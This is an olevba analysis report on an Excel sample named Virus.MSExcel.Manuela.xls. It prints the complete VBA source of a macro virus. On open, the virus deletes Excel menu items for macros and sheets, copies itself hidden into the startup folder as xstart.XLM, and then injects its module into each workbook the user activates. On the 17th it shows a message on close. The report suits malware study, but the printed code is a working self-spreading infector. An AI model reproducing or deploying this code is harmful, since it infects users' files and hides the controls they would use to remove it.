olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Manuela.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: Virus.MSExcel.Manuela.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Virus.MSExcel.Manuela.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: Virus.MSExcel.Manuela.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: Virus.MSExcel.Manuela.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSExcel.Manuela.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = False
MenuBars(xlWorksheet).Reset
MenuBars(xlModule).Reset
MenuBars(xlNoDocuments).Reset
MenuBars(xlInfo).Reset
MenuBars(xlChart).Reset
MenuBars(xlWorksheet).Menus("Tools").MenuItems("---").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlWorksheet).Menus("Window").MenuItems("&Hide").Delete
MenuBars(xlWorksheet).Menus("Window").MenuItems("&Unhide...").Delete
MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("--").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("&Delete...").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("De&lete Sheet").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("&Move or Copy Sheet...").Delete
MenuBars(xlWorksheet).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("---").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlChart).Menus("Window").MenuItems("&Hide").Delete
MenuBars(xlChart).Menus("Window").MenuItems("&Unhide...").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("--").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("De&lete Sheet").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("&Move or Copy Sheet...").Delete
MenuBars(xlChart).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlModule).Menus("Tools").MenuItems("Assig&n Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("--").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Record New Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Unhide...").Delete
If cek_tiers() Then 'check on tiers!
    GoTo HobSheet:  'found?
Else
    infecttiers     'Do you know who I am? ;*)
End If
HobSheet:
Application.OnSheetActivate = "xstart.XLM!Hob"
bye:
End Sub

Function cek_tiers() As Boolean
cek_tiers = False
For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "xstart.XLM" Then
    For y = 1 To Application.Workbooks("xstart.XLM").Modules.Count
        If Application.Workbooks("xstart.XLM").Modules(y).Name = "Module1" Then
            cek_tiers = True
        End If
    Next y
    End If
Next x
End Function

Function infecttiers()
  activebook = ActiveWorkbook.Name
  Workbooks(activebook).SaveCopyAs Application.StartupPath + "\xstart.XLM"
  Workbooks.Open (Application.StartupPath + "\xstart.XLM")
  Windows("xstart.XLM").Visible = False
 Application.Workbooks("xstart.XLM").Save
End Function

Function inHobIt() As Boolean
activebook = ActiveWorkbook.Name
inHobIt = False
For y = 1 To Application.Workbooks(activebook).Modules.Count
    If Application.Workbooks(activebook).Modules(y).Name = "Module1" Then
            inHobIt = True
   End If
Next y
End Function

Sub Hob()
    oactivebook = ActiveWorkbook.Name
    If inHobIt() Then 'already studied?
    GoTo bye2
    Else
    End If
    Application.ScreenUpdating = False
    Application.Windows("xstart.XLM").Visible = True
    Workbooks("xstart.XLM").Activate
    Sheets("Module1").Visible = True
    Workbooks("xstart.XLM").Sheets("Module1").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks(oactivebook).Sheets("Module1").Visible = False
    Workbooks("xstart.XLM").Sheets("Module1").Visible = False
    Windows("xstart.XLM").Visible = False
bye2:
Close
End Sub

Sub Auto_Close()
On Error GoTo bye3
Application.DisplayAlerts = False
Application.Workbooks("xstart.XLM").Save
If Day(Date) = "17" Then

    MsgBox "Hello Manuela!"
I know we're just like old friends, we just can't pretend, that lovers make amend. We can't help, but feel that something has been lost. We are strangers on the street and strangers on the line, but lovers all the time. Manuela, you know this is not the end, we always be good friends. -=Perfect=-", 48
Else
End If
bye3:
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle3
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible - Modul1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

